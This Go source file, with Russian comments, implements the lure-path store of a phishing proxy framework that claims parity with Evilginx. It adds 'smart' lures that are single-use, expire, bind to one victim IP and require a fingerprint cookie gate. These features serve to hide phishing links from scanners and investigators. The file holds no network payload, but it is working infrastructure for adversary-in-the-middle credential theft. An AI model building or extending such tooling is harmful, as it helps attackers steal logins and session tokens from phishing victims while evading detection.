// Package lures — пути-приманки /l/* (Evilginx lures паритет) + Smart Lures:
// одноразовые, TTL, IP-bind, challenge-gate. core.LureStore заморожен,
// smart-функции — расширением через интерфейс SmartResolver (type-assert в engine).
package lures

import (
	"fmt"
	"sync"
	"time"
)

type Store struct {
	mu    sync.RWMutex
	m     map[string]string // path -> phishletID (legacy static)
	smart map[string]*Smart
}

// Smart — одноразовая/условная приманка.
type Smart struct {
	Path             string
	PhishletID       string
	ExpiresAt        time.Time // zero = без срока
	MaxUses          int       // 0 = безлимит, 1 = одноразовая
	Uses             int
	BoundIP          string // "" = любой IP
	RequireChallenge bool   // нужен cookie __fp_ok=1
}

func New() *Store { return &Store{m: map[string]string{}, smart: map[string]*Smart{}} }

func (s *Store) Add(path, phishletID string) {
	s.mu.Lock()
	s.m[path] = phishletID
	s.mu.Unlock()
}

func (s *Store) Resolve(path string) (string, bool) {
	s.mu.RLock()
	defer s.mu.RUnlock()
	v, ok := s.m[path]
	return v, ok
}

// SeedFromPhishlets — автоприманки из LurePath каждого phishlet.
func (s *Store) Seed(id, lurePath string) {
	if lurePath == "" {
		return
	}
	s.Add(lurePath, id)
}

// SmartCreate — валидация + запись smart-приманки.
func (s *Store) SmartCreate(sm Smart) error {
	if sm.Path == "" || len(sm.Path) < 4 || sm.Path[:3] != "/l/" {
		return fmt.Errorf("smart lure path must start with /l/")
	}
	if sm.PhishletID == "" {
		return fmt.Errorf("phishlet_id required")
	}
	if !sm.ExpiresAt.IsZero() && time.Until(sm.ExpiresAt) <= 0 {
		return fmt.Errorf("expires_at in the past")
	}
	if sm.MaxUses < 0 {
		return fmt.Errorf("max_uses must be >= 0")
	}
	s.mu.Lock()
	s.smart[sm.Path] = &sm
	s.mu.Unlock()
	return nil
}

// SmartResolver реализуют smart-сторы; engine проверяет через type-assert.
type SmartResolver interface {
	ResolveSmart(path, ip string, fpOK bool) (string, bool)
}

// ResolveSmart — проверка TTL/uses/IP/challenge + списание использования.
func (s *Store) ResolveSmart(path, ip string, fpOK bool) (string, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	// Legacy static всегда валидны (обратная совместимость).
	if pid, ok := s.m[path]; ok {
		return pid, true
	}
	sm, ok := s.smart[path]
	if !ok {
		return "", false
	}
	if !sm.ExpiresAt.IsZero() && time.Now().After(sm.ExpiresAt) {
		delete(s.smart, path)
		return "", false
	}
	if sm.MaxUses > 0 && sm.Uses >= sm.MaxUses {
		delete(s.smart, path)
		return "", false
	}
	if sm.BoundIP != "" && sm.BoundIP != ip {
		return "", false
	}
	if sm.RequireChallenge && !fpOK {
		return "", false
	}
	sm.Uses++
	pid := sm.PhishletID
	if sm.MaxUses > 0 && sm.Uses >= sm.MaxUses {
		delete(s.smart, path) // одноразовая сгорела
	}
	return pid, true
}

// ListSmart — снапшот для API/персистентности.
func (s *Store) ListSmart() []Smart {
	s.mu.RLock()
	defer s.mu.RUnlock()
	out := make([]Smart, 0, len(s.smart))
	for _, sm := range s.smart {
		out = append(out, *sm)
	}
	return out
}
